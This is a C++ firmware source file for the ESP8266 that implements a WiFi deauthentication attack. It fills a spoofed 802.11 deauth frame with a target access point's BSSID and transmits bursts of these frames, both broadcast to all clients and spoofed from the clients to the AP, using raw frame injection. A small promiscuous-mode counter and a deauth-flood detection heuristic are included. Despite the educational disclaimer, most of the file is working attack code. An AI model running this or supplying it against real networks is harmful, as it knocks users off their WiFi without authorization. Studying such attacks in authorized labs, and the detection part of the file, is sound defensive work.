/*
 * wifi_attacks.cpp — WiFi deauthentication & packet monitoring
 *
 * ================================================================
 *  ⚠ EDUCATIONAL / DEFENSIVE RESEARCH USE ONLY
 *  This code is for authorized lab testing and defensive
 *  cybersecurity education in controlled environments.
 * ================================================================
 *
 * Uses the ESP-IDF raw 802.11 frame injection API to send
 * deauthentication frames.  Also implements a promiscuous-mode
 * packet counter and basic deauth-flood detection.
 */

#include "wifi_attacks.h"
#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

// ── State ────────────────────────────────────────────────────────
static WifiAttackState _state = WATK_IDLE;
static uint8_t  _targetBSSID[6];
static uint8_t  _targetChannel = 1;
static uint32_t _frameCount = 0;
static unsigned long _lastBurst = 0;

// Packet counter (promiscuous mode)
static volatile uint32_t _pktCount = 0;
static volatile uint32_t _deauthPktCount = 0;
static unsigned long _pktCountStart = 0;

/*
 * 802.11 deauthentication frame template (26 bytes)
 * Byte layout:
 *   [0-1]   Frame Control  = 0xC0 0x00  (Deauth)
 *   [2-3]   Duration       = 0x00 0x00
 *   [4-9]   Destination    = broadcast or client MAC
 *   [10-15] Source         = BSSID (spoofed as AP)
 *   [16-21] BSSID          = BSSID
 *   [22-23] Sequence       = 0x00 0x00
 *   [24-25] Reason code    = 0x01 0x00  (Unspecified)
 */
static uint8_t _deauthFrame[26] = {
  0xC0, 0x00,                         // Frame Control: Deauth
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: BSSID (filled at runtime)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled at runtime)
  0x00, 0x00,                         // Sequence number
  0x01, 0x00                          // Reason code: Unspecified
};

/*
 * Promiscuous mode RX callback
 * Counts all received frames and separately counts deauth/disassoc.
 */
static void _promiscRxCb(uint8_t *buf, uint16_t len) {
  if (len < 13) return; // Must have RxControl + at least 1 byte
  _pktCount++;

  // On ESP8266, buf typically starts with struct RxControl (12 bytes)
  // The first byte of the 802.11 frame is at offset 12.
  uint8_t frameType = buf[12];
  // Deauth = 0xC0, Disassoc = 0xA0
  if (frameType == 0xC0 || frameType == 0xA0) {
    _deauthPktCount++;
  }
}

// ── Public API ──────────────────────────────────────────────────

void wifi_attacks_init() {
  // Ensure WiFi is in STA mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  // Allow raw frame TX
  wifi_promiscuous_enable(0);
  DBGLN(F("[WATK] WiFi attacks subsystem initialized"));
}

/*
 * wifi_attacks_deauth_start()
 * Prepares and begins sending deauthentication frames to a target AP.
 */
void wifi_attacks_deauth_start(const uint8_t bssid[6], uint8_t channel) {
  memcpy(_targetBSSID, bssid, 6);
  _targetChannel = channel;
  _frameCount = 0;
  _lastBurst = 0;

  // Set WiFi channel
  wifi_promiscuous_enable(1);
  wifi_set_channel(_targetChannel);

  // Fill the BSSID into the deauth frame template
  memcpy(&_deauthFrame[10], _targetBSSID, 6);  // Source
  memcpy(&_deauthFrame[16], _targetBSSID, 6);  // BSSID

  _state = WATK_RUNNING;
  DBGF("[WATK] Deauth started on ch%d  BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
       channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

void wifi_attacks_deauth_stop() {
  _state = WATK_STOPPED;
  wifi_promiscuous_enable(0);
  DBGF("[WATK] Deauth stopped. Total frames: %lu\n", _frameCount);
}

/*
 * wifi_attacks_update()
 * Non-blocking burst sender.  Call every loop().
 * Returns the number of frames sent this iteration.
 */
uint16_t wifi_attacks_update() {
  if (_state != WATK_RUNNING) return 0;

  unsigned long now = millis();
  if (now - _lastBurst < DEAUTH_BURST_INTERVAL_MS) return 0;
  _lastBurst = now;

  uint16_t sent = 0;
  for (uint16_t i = 0; i < DEAUTH_FRAME_COUNT; i++) {
    // Update sequence number
    _deauthFrame[22] = (_frameCount & 0xFF);
    _deauthFrame[23] = ((_frameCount >> 8) & 0x0F);

    // Broadcast deauth (AP → all clients)
    _deauthFrame[4] = 0xFF; _deauthFrame[5] = 0xFF;
    _deauthFrame[6] = 0xFF; _deauthFrame[7] = 0xFF;
    _deauthFrame[8] = 0xFF; _deauthFrame[9] = 0xFF;
    wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
    _frameCount++;
    sent++;

    // Also send as if from client to AP (spoofed disconnect)
    // Swap source/dest for a second frame
    memcpy(&_deauthFrame[4], _targetBSSID, 6);   // Dest = BSSID
    _deauthFrame[10] = 0xFF; _deauthFrame[11] = 0xFF;
    _deauthFrame[12] = 0xFF; _deauthFrame[13] = 0xFF;
    _deauthFrame[14] = 0xFF; _deauthFrame[15] = 0xFF;
    wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
    _frameCount++;
    sent++;

    // Restore original template
    _deauthFrame[4] = 0xFF; _deauthFrame[5] = 0xFF;
    _deauthFrame[6] = 0xFF; _deauthFrame[7] = 0xFF;
    _deauthFrame[8] = 0xFF; _deauthFrame[9] = 0xFF;
    memcpy(&_deauthFrame[10], _targetBSSID, 6);

    delayMicroseconds(DEAUTH_DELAY_MS * 100);  // Small inter-frame gap
  }

  DBGF("[WATK] Burst sent: %d frames (total: %lu)\n", sent, _frameCount);
  return sent;
}

WifiAttackState wifi_attacks_getState() {
  return _state;
}

uint32_t wifi_attacks_getFrameCount() {
  return _frameCount;
}

/*
 * wifi_attacks_startPacketCounter()
 * Enables promiscuous mode to count all received frames.
 */
void wifi_attacks_startPacketCounter() {
  _pktCount = 0;
  _deauthPktCount = 0;
  _pktCountStart = millis();

  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(_promiscRxCb);
  DBGLN(F("[WATK] Packet counter started (promiscuous mode)"));
}

void wifi_attacks_stopPacketCounter() {
  wifi_promiscuous_enable(0);
  DBGLN(F("[WATK] Packet counter stopped"));
}

uint32_t wifi_attacks_getPacketCount() {
  return _pktCount;
}

void wifi_attacks_resetPacketCount() {
  _pktCount = 0;
  _deauthPktCount = 0;
  _pktCountStart = millis();
}

/*
 * wifi_attacks_detectInterference()
 * Heuristic: if more than 100 deauth/disassoc frames seen
 * within 10 seconds, flag as potential interference/attack.
 */
bool wifi_attacks_detectInterference() {
  unsigned long elapsed = millis() - _pktCountStart;
  if (elapsed < 1000) return false;

  // Rate: deauth frames per second
  float rate = (float)_deauthPktCount / (elapsed / 1000.0);
  return rate > 10.0;   // > 10 deauth frames/sec is suspicious
}
